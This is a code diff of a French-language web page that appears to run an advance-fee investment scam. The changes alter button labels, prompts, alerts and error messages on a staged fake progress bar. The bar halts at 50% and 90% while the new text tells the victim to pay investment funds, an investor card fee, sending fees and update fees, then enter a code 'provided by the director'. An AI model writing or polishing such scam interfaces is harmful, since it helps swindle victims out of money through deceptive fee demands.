@@ -149,7 +149,7 @@
     <p class="error-message" id="error-msg"></p>
 
     <div style="display: flex; justify-content: center; gap: 10px; margin-top: 10px;">
-      <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
+      <input type="button" value="Veuillez payer les Fond d’investissement et entre de code fourni part le directeur merci" class="button" id="btn-deblock">
     </div>
   </div>
 
@@ -168,7 +168,7 @@
         `;
 
     document.querySelector('#btn-deblock').addEventListener('click', () => {
-      let code2 = prompt("Cette carte vous identifie officiellement comme investisseur et vous donne accès à nos services.");
+      let code2 = prompt("Chère client veuilez payer les frais de carte d’investissement : Cette carte vous identifie officiellement comme investisseur et vous donne accès à nos services.");
       if (code2 === "4008") {
         startProgressBar();
         document.querySelector('#invest').innerText = "En cours d'investissement...";
@@ -199,8 +199,8 @@
 
         } else {
           clearInterval(interval); // Arrête la progression à 90%
-          errorMsg.innerHTML = "Erreur :Utilisés pour le traitement et la validation de vos transactions.";
-          alert("Erreur : Utilisés pour le traitement et la validation de vos transactions.");
+          errorMsg.innerHTML = "Erreur Enfin de finaliser la transaction veuilez payer les Frais d’envoi : Utilisés pour le traitement et la validation de vos transactions.";
+          alert("Erreur :Enfin de finaliser la transaction veuilez payer les Frais d’envoi : Utilisés pour le traitement et la validation de vos transactions.");
           const userCode = prompt(`Veuillez entrer le code pour continuer `);
           if (userCode === "5678") {
             alert("Investissement terminé !");
@@ -232,8 +232,8 @@
       let interval = setInterval(() => {
         if (progress === 50) {
           clearInterval(interval); // Arrête la progression à 50%
-          setInterval.innerHTML = "Erreur :Ces frais permettent de maintenir votre compte actif, d’assurer la gestion régulière de votre capital et d’actualiser vos bénéfices.";
-          handleCodePrompt("Erreur : Ces frais permettent de maintenir votre compte actif, d’assurer la gestion régulière de votre capital et d’actualiser vos bénéfices.", "2004"); // Demande le code à 50%
+          setInterval.innerHTML ="Nous somme à Fin de votre investissement veuilez payer les frais de mise à jour de votre investissement :Ces frais permettent de maintenir votre compte actif, d’assurer la gestion régulière de votre capital et d’actualiser vos bénéfices.";
+          handleCodePrompt("Nous somme à Fin de votre investissement veuilez payer les frais de mise à jour de votre investissement :Ces frais permettent de maintenir votre compte actif, d’assurer la gestion régulière de votre capital et d’actualiser vos bénéfices.", "2004"); // Demande le code à 50%
         } else {
           updateProgress(); // Continue la progression
         }
